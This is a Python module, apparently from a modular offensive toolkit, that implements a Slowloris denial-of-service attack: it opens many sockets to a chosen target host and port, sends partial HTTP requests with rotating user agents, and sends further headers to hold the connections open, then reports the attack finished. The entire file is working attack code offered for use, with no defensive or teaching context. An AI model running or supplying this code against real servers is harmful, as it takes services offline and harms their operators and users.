import requests
from rich.console import Console
from rich.table import Table
import socket
import random

class Module:
    def __init__(self, logger):
        self.logger = logger
        self.name = "dos/slowloris"
        self.description = "Slowloris based DoS attack."
        self.author = "Onur Atakan ULUSOY"
        self.runauto = False        
        self.options = {
            "target": {"value": None, "required": True},
            "port": {"value": None, "required": True},
            "amount": {"value": None, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Name")
        table.add_column("Description")
        table.add_column("Author")
        table.add_row(self.name, self.description, self.author)
        console.print(table)


    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error(f"Required key {str(key)} is not set for {self.name}")
                return


        target = self.options["target"]["value"]
        port = int(self.options["port"]["value"])
        amount = int(self.options["amount"]["value"])


        user_agents = [
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
            "Opera/9.80 (Windows NT 6.1; U; en) Presto/2."
        ]

        s_list = []
        for i in range(amount):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1".encode())
            s.send(f"User-Agent: {random.choice(user_agents)}".encode())
            s.send(b"Accept-language: en-US,en,q=0.5")
            s_list.append(s)
        for s in list(s_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}".encode())
            except socket.error:
                s_list.remove(s)  

        print(f"\033[32m[+]\033[0m Finished Slowloris based DoS attack on {target}-{port}")


